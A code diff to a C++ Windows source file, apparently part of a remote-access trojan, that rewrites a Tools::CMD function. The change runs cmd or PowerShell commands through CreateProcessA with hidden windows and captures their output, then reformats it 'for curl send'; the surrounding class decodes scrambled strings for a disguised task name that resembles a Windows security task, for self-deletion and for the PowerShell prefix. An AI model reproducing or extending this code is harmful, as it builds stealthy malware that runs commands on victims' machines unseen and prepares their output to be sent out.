@@ -11,6 +11,8 @@
 #include "Tools.h"
 
 #include <TlHelp32.h>
+#include <string>
+#include <sstream>
 
 Tools::Tools() : HIDE_NAME(this->decode("ecsSowndWiskTatyriu")),
 				 SELF_DELETE(this->decode("teledethpa_")),
@@ -130,21 +132,90 @@ BOOL Tools::isSystem32Bit()
 std::string Tools::CMD(std::string command, BOOL modify_for_curl_send, BOOL powershell, BOOL changeDirectory, BOOL fileExplorer)
 {
 	if (powershell)
-		command =  this->decode("llherswepondmaom-c ") + " \" & " + std::string(command) + "\""; // decode string -> powershell -command
+		command = this->decode("llherswepondmaom-c ") + " \" & " + std::string(command) + "\""; // decode string -> powershell -command
 
 	#ifndef LOG_OFF
 		std::string command_debug = "Tools::CMD => Command: " + command + "\n";
 		OutputDebugStringA(command_debug.c_str());
 	#endif // !LOG_OFF
 
-	std::array<char, 128> buffer;
 	std::string result;
-	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);
-	if (!pipe)
-		throw std::runtime_error("Error!"); // popen() failed.
+	std::string sLog = "";
 
-	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
-		result += buffer.data();
+	// Use CreateProcess to hide the window
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+	SECURITY_ATTRIBUTES sa;
+	HANDLE hRead = NULL, hWrite = NULL;
+
+	ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&pi, sizeof(pi));
+	ZeroMemory(&sa, sizeof(sa));
+	sa.nLength = sizeof(sa);
+	sa.bInheritHandle = TRUE;
+	sa.lpSecurityDescriptor = NULL;
+
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+	si.wShowWindow = SW_HIDE;
+
+	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
+	{
+		if (hRead != NULL)
+			CloseHandle(hRead);
+		if (hWrite != NULL)
+			CloseHandle(hWrite);
+
+		#ifndef LOG_OFF
+			OutputDebugStringA("Tools::CMD => CreatePipe failed\n");
+		#endif // !LOG_OFF
+
+		return "";
+	}
+
+	si.hStdOutput = hWrite;
+	si.hStdError = hWrite;
+	si.hStdInput = NULL;
+
+	std::string cmdLine = "cmd.exe /c " + command;
+	if (powershell)
+		cmdLine = command; // already powershell -command
+
+	BOOL success = CreateProcessA(
+		NULL,
+		(LPSTR)cmdLine.c_str(),
+		NULL,
+		NULL,
+		TRUE,
+		CREATE_NO_WINDOW,
+		NULL,
+		NULL,
+		&si,
+		&pi
+	);
+
+	CloseHandle(hWrite);
+
+	if (!success)
+	{
+		CloseHandle(hRead);
+		#ifndef LOG_OFF
+			OutputDebugStringA("Tools::CMD => CreateProcessA failed\n");
+		#endif // !LOG_OFF
+
+		return "";
+	}
+
+	std::array<char, 128> buffer;
+	DWORD bytesRead;
+	while (ReadFile(hRead, buffer.data(), (DWORD)buffer.size(), &bytesRead, NULL) && bytesRead > 0)
+		result.append(buffer.data(), bytesRead);
+
+	CloseHandle(hRead);
+
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
 
 	// Change Directory option
 	if (changeDirectory)
@@ -152,13 +223,17 @@ std::string Tools::CMD(std::string command, BOOL modify_for_curl_send, BOOL powe
 			if (SetCurrentDirectoryA(command.c_str()))
 				result = "success";
 
+	#ifndef LOG_OFF
+		sLog = "Tools::CMD => result (before fix): " + result + "\n";
+		OutputDebugStringA(sLog.c_str());
+	#endif // !LOG_OFF
+
 	// Check if the string need to be fix
-	
 	if (result != "")
 	{
 		if (!fileExplorer)
 		{
-
+			// If fileExplorer is false, remove all newline characters ('\n') and carriage return characters ('\r') from the result string
 			if (result.find('\n') != std::string::npos)
 				result.erase(std::remove(result.begin(), result.end(), '\n'), result.end());
 
@@ -167,30 +242,77 @@ std::string Tools::CMD(std::string command, BOOL modify_for_curl_send, BOOL powe
 		}
 		else
 		{
+			// If fileExplorer is true, replace all newline characters ('\n') in the result string with asterisks ('*')
 			if (result.find('\n') != std::string::npos)
 				for (size_t i = 0; i < result.length(); i++)
 					if (result[i] == '\n')
 						result[i] = '*';
 		}
 
+		/*
+		#ifndef LOG_OFF
+			sLog = "Tools::CMD => result (after fix 1): " + result + "\n";
+			OutputDebugStringA(sLog.c_str());
+		#endif // !LOG_OFF
+		*/
 
+		// Replace all double spaces with single spaces
 		std::string::size_type pos = result.find("  ");
-
 		while (pos != std::string::npos)
 		{
 			result.replace(pos, 2, " ");
 			pos = result.find("  ", pos);
 		}
 
+		/*
+		#ifndef LOG_OFF
+			sLog = "Tools::CMD => result (after fix 2): " + result + "\n";
+			OutputDebugStringA(sLog.c_str());
+		#endif // !LOG_OFF
+		*/
+
+		// Remove leading and trailing spaces
 		if (result.find(' ') != std::string::npos)
 		{
+			int i = 0;
 			while (result != "" && result[result.size() - 1] == ' ')
+			{
 				result.erase(result.size() - 1);
 
+				/*
+				#ifndef LOG_OFF
+					std::stringstream ss;
+					ss << i;
+					sLog = "Tools::CMD => result (after fix 3): " + ss.str() + " " + result + "\n";
+					OutputDebugStringA(sLog.c_str());
+				#endif // !LOG_OFF
+				i++;
+				*/
+			}
+
 			while (result[0] == ' ')
-				result.erase(0, 0);
+			{
+				result.erase(0, 1);
+				/*
+				#ifndef LOG_OFF
+					std::stringstream ss;
+					ss << i;
+					sLog = "Tools::CMD => result (after fix 4): " + ss.str() + " " + result + "\n";
+					OutputDebugStringA(sLog.c_str());
+				#endif // !LOG_OFF
+				i++;
+				*/
+			}
 		}
 
+		/*
+		#ifndef LOG_OFF
+			sLog = "Tools::CMD => result (after fix 5): " + result + "\n";
+			OutputDebugStringA(sLog.c_str());
+		#endif // !LOG_OFF
+		*/
+
+		// If modify_for_curl_send is true, replace all spaces with plus signs ('+')
 		if (modify_for_curl_send)
 		{
 			if (result.find(' ') != std::string::npos)
@@ -198,8 +320,20 @@ std::string Tools::CMD(std::string command, BOOL modify_for_curl_send, BOOL powe
 					if (result[i] == ' ')
 						result[i] = '+';
 		}
+
+		/*
+		#ifndef LOG_OFF
+			sLog = "Tools::CMD => result (after fix 6): " + result + "\n";
+			OutputDebugStringA(sLog.c_str());
+		#endif // !LOG_OFF
+		*/
 	}
-	
+
+	#ifndef LOG_OFF
+		sLog = "Tools::CMD => result (after fix): " + result + "\n";
+		OutputDebugStringA(sLog.c_str());
+	#endif // !LOG_OFF
+
 	return result;
 }
 
